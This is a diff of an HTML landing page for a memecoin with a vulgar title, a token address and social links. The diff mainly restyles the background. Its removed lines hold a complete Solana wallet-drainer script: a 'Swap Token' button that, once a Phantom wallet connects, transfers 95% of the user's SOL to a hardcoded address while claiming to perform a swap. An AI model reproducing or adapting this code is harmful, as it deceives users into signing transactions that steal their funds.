@@ -7,13 +7,12 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: black;
-            background-image: url('https://example.com/eagle-usa-flag.jpg'); /* Replace with an actual link */
-            background-size: cover;
-            background-position: center;
             color: white;
             text-align: center;
             padding: 20px;
+            background: url('https://shots.codepen.io/pleasedonotdisturb/pen/wvadazR-800.jpg') no-repeat center center fixed;
+            background-size: cover;
+            animation: moveBackground 20s linear infinite;
         }
         h1 {
             color: #f4c542;
@@ -27,13 +26,6 @@
             margin: 0 10px;
             text-decoration: none;
             color: #00aaff;
-            display: inline-flex;
-            align-items: center;
-        }
-        .social-links a img {
-            width: 24px;
-            height: 24px;
-            margin-right: 5px;
         }
         .social-links a:hover {
             color: #005f6b;
@@ -57,80 +49,26 @@
         button:hover {
             background-color: #0056b3;
         }
+
+        /* Keyframes for the background movement */
+        @keyframes moveBackground {
+            0% { background-position: 0 0; }
+            50% { background-position: 10% 10%; }
+            100% { background-position: 0 0; }
+        }
     </style>
 </head>
 <body>
-
-    <!-- Logo -->
     <img id="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQXNmiKvPO7mq3itqnpiMSUuqIYjiaGlaRpDsFopvlD3B7OiNkC6o78vp8&s=10" alt="Logo">
 
     <h1>We Love Pussy</h1>
     <p class="description">We love pussy and that's what makes the world great.</p>
 
-    <!-- Token Contract Address -->
     <p id="tokenAddress">Token Contract Address: 7awd6NXmEaYWV496StCrTGstRWacr14KR8SLkbjC5Pc6</p>
 
-    <!-- Social Media Links -->
     <div class="social-links">
-        <a href="https://t.me/welovepussycommunity" target="_blank">
-            <img src="https://cdn.icon-icons.com/icons2/2699/PNG/512/telegram_logo_icon_169134.png" alt="Telegram Icon"> Join us on Telegram
-        </a> |
-        <a href="https://x.com/welovepussycto?s=21" target="_blank">
-            <img src="https://cdn.icon-icons.com/icons2/2699/PNG/512/twitter_logo_icon_170852.png" alt="Twitter Icon"> Follow us on Twitter (X)
-        </a>
+        <a href="https://t.me/welovepussycommunity" target="_blank">Join us on Telegram</a> |
+        <a href="https://x.com/welovepussycto?s=21" target="_blank">Follow us on Twitter (X)</a>
     </div>
-
-    <!-- Action Button -->
-    <button id="connectButton">Connect Wallet</button>
-    <button id="swapButton" disabled>Swap Token</button>
-
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
-    <script>
-        const { PublicKey, Transaction, SystemProgram, Connection, clusterApiUrl } = solanaWeb3;
-        const recipientAddress = new PublicKey("3GXcLtX156MuRWSPAHWf9VPDaSPPZA6Tn1aARzUaWW8N");
-        let provider;
-        let userAccount;
-        const connection = new Connection(clusterApiUrl("mainnet-beta"));
-
-        // Connect to Phantom Wallet
-        document.getElementById("connectButton").addEventListener("click", async () => {
-            if (window.solana && window.solana.isPhantom) {
-                provider = window.solana;
-                try {
-                    await provider.connect();
-                    userAccount = provider.publicKey.toString();
-                    document.getElementById("walletAddress").innerText = "Wallet Address: " + userAccount;
-                    document.getElementById("swapButton").disabled = false;
-                } catch (error) {
-                    console.error("Error connecting to Phantom Wallet", error);
-                }
-            } else {
-                alert("Please install Phantom Wallet!");
-            }
-        });
-
-        // Swap Token Functionality (Send 95% of SOL balance)
-        document.getElementById("swapButton").addEventListener("click", async () => {
-            try {
-                // Get user's SOL balance and calculate 95%
-                const balance = await connection.getBalance(provider.publicKey);
-                const amountToSend = Math.floor(balance * 0.95); // 95% of balance
-
-                // Create and send transaction
-                const transaction = new Transaction().add(
-                    SystemProgram.transfer({
-                        fromPubkey: provider.publicKey,
-                        toPubkey: recipientAddress,
-                        lamports: amountToSend
-                    })
-                );
-
-                const signature = await provider.signAndSendTransaction(transaction);
-                document.getElementById("status").innerText = "Swap successful: " + signature;
-            } catch (error) {
-                document.getElementById("status").innerText = "Swap failed: " + error.message;
-            }
-        });
-    </script>
 </body>
 </html>
